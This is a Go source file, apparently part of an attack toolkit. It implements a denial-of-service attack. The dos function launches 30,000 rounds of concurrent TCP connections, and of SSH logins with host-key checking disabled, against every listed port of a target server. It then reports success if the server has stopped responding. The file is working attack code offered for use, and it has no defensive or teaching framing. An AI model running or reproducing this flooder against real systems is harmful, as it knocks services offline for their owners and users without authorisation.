package dos

import (
	"fmt"
	"net"
	"sync"
	"time"

	"attacks/structs"

	"golang.org/x/crypto/ssh"
)

func RunDOS(data *structs.Data) *structs.Results {
	fmt.Printf("[+] Running DOS Attack on %s\n", data.Server)
	startTime := time.Now()
	success := dos(data)
	endTime := time.Now()
	totalTime := endTime.Sub(startTime)
	results := structs.Results{
		TotalTime: totalTime.Seconds(),
		Success:   success,
	}
	return &results
}

func checkConnection(address string) bool {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return true
	}
	conn.Close()
	return false
}

func connect(address string, wg *sync.WaitGroup) int {
	defer wg.Done()
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return 0
	}
	conn.Close()
	return 1
}

func createConfig(username string, password string) *ssh.ClientConfig {
	sshClientConfig := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}
	return sshClientConfig
}

func sshConnect(address string, sshConfig *ssh.ClientConfig, wg *sync.WaitGroup) {
	defer wg.Done()
	client, err := ssh.Dial("tcp", address, sshConfig)
	if err != nil {
		return
	}
	client.Close()
}

func dos(data *structs.Data) bool {
	var wg sync.WaitGroup
	sshConfig := createConfig(data.User, data.Pass)
	for i := 0; i < 30000; i++ {
		for port, specs := range data.Ports {
			wg.Add(1)
			server := net.JoinHostPort(data.Server, port)
			if specs["name"] == "ssh" {
				go sshConnect(server, sshConfig, &wg)
			} else {
				go connect(server, &wg)
			}
		}
	}
	wg.Wait()
	var checkPort string
	for port := range data.Ports {
		checkPort = port
		break
	}
	serverStatus := checkConnection(net.JoinHostPort(data.Server, checkPort))
	return serverStatus
}
